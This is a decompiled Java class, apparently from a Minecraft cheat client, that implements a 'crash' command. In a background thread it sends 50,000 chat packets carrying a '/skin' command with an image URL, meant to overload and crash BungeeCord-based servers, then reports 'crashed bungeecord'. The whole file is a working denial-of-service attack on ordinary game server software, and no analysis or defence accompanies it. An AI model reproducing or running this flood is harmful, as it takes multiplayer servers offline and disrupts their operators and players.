/* Decompiler 3ms, total 407ms, lines 31 */
package wtf.evolution.command.impl;

import net.minecraft.network.play.client.CPacketChatMessage;
import wtf.evolution.command.Command;
import wtf.evolution.command.CommandInfo;
import wtf.evolution.helpers.ChatUtil;

@CommandInfo(
   name = "crash"
)
public class CrashCommand extends Command {
   public static boolean hide = false;

   public void execute(String[] args) {
      super.execute(args);
      hide = true;
      (new Thread(() -> {
         for(int f = 0; f < 50000; ++f) {
            this.mc.player.connection.sendPacket(new CPacketChatMessage("/skin https://i.imgur.com/prP5baL.png"));
         }

         hide = false;
         ChatUtil.print("crashed bungeecord");
      })).start();
   }

   public void onError() {
      super.onError();
   }
}
